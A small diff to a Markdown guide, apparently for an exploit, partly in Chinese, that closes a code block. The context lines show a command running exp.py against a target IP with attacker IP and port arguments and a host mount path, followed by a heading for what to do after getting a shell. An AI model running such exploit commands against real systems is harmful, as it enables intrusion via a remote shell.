@@ -15,6 +15,7 @@ python3 exp.py -t {target-ip} -a {attacker-ip} -p {attacker-port}
 
 ```bash
 python3 exp.py -t {target-ip} -a {attacker-ip} -p {attacker-port} -m /mnt/host/c
+```
 
 ## 4. 拿到 shell 后
 
